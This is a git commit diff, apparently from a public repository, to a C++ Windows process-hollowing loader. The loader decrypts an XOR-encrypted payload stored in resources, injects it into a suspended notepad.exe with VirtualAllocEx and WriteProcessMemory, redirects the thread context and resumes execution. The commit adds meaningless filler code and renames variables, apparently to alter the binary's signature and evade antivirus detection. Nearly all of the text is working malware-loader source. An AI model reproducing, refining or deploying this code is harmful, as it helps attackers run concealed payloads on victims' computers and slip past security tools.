c1a5f628c5c698c4bb7ae0d5f40ba193ffa7a41f
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-31 08:40:29 -0500

    Update hollowing.cpp

--- dummyda/hollowing.cpp
+++ dummyda/hollowing.cpp
@@ -21,6 +21,12 @@ void loadResource_with(const char* renamer, char** data, DWORD* size) {
     *size = SizeofResource(hModule, hResource);
     *data = (char*)LockResource(hResData);
 }
+void generate_complex_numbers() {
+    std::vector<int> vec = {1, 2, 3, 4, 5};
+    std::random_device rd;       // Non-deterministic seed
+    std::mt19937 gen(rd());     
+    std::shuffle(vec.begin(), vec.end(), gen);  
+}
 
 int main() {
     
@@ -28,13 +34,16 @@ int main() {
     char* key101k;
     DWORD key101kLen;
     loadResource_with("dhanushkey1", &key101k, &key101kLen);
+    const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
     char* code199k;
     DWORD code199kLen;
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
-     const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
+     
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
+    LARGE_INTEGER counter;
+    QueryPerformanceCounter(&counter);
     CreateProcess(processptaah, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
     GetTickCount();
     
@@ -43,12 +52,13 @@ int main() {
     GetTickCount();
     GetThreadContext(pi.hThread, &ctx);
 
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID saber = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    GetTickCount();
     for (DWORD da = 0; da < code199kLen; da++) {
         code199k[da] ^= key101k[da % key101kLen];
     }
-    WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
-    ctx.Rcx = (DWORD64)memlo; 
+    WriteProcessMemory(pi.hProcess, saber, code199k, code199kLen, NULL);
+    ctx.Rcx = (DWORD64)saber; 
     SetThreadContext(pi.hThread, &ctx);
 
     ResumeThread(pi.hThread); 
